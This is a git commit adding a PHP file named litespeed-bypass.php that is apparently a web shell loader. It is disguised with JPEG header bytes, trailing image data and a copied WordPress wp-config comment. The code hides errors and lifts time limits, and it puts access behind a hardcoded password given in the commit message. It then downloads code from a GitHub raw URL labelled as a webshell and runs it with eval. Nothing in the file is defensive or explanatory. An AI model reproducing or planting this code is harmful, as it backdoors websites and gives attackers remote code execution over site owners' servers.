ffe9235a62c4211c7d53c44e7b044b201d1a54af
Anonrocks <52328375+Anonrocks@users.noreply.github.com>
2024-09-13 20:53:34 +0700

    Create litespeed-bypass.php
    password: gud boy

---
+++ litespeed-bypass.php
@@ -0,0 +1,69 @@
+����JFIF��
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+ *
+ * @package WordPress
+ */
+ignore_user_abort(true);
+ini_set('memory_limit', '-1');
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('max_execution_time', 5000);
+// are u challange me :v
+$hashed_password = '$2y$10$QSGYu2pSK8RtNYa4F/2DEuO5/kiaBnO9IBch7B4QSnA7z8zoZQarG'; // Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik default password gud boy
+// Fungsi untuk menampilkan form login
+//
+function admin_login() {
+    echo '<title>Login</title>';
+    echo '<form method="post">';
+    echo '<input type="password" name="password">';
+    echo '<input type="submit" value="Login">';
+    echo '</form>';
+    exit;
+}
+
+if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
+    // Author Boleh Masuk Heker Jangan Masuk 
+    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
+        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie Berhasil
+        // Logika setelah login berhasil
+    } else {
+        admin_login();
+    }
+}
+
+$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="robots" content="noindex">
+<title>explorer manager</title>
+<style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}
+</style>
+</head>';
+$url = "https://raw.githubusercontent.com/Anonrocks/Exploitssss/master/webshell%20bypass%20server%202024.png";
+$ch = curl_init($url); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($ch);
+eval("?>".$result);
+?>
+	
+
+			
+
+		
+
+
+��C	������"#Qr����&1!A"2qQa���?�y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H�@T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�x?"���Y騐�O�	q�`~~�t�U�Cڒ�V		I1��_��
